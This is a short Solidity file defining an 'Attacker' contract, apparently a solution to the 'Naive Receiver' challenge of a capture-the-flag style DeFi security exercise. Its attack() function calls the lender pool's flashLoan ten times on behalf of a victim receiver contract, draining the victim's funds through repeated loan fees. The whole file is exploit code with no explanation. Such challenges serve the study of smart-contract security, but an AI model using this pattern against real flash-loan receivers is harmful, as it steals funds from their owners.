// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

contract Attacker is NaiveReceiverLenderPool {
    NaiveReceiverLenderPool public poolContract;
    IERC3156FlashBorrower public victim;
    address public token = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant ether_number = 1;

    constructor(
        NaiveReceiverLenderPool _poolAddress,
        IERC3156FlashBorrower _victim
    ) {
        poolContract = _poolAddress;
        victim = _victim;
    }

    function attack() public {
        for (uint i = 0; i < 10; i++) {
            poolContract.flashLoan(victim, token, ether_number, "0x");
        }
    }
}
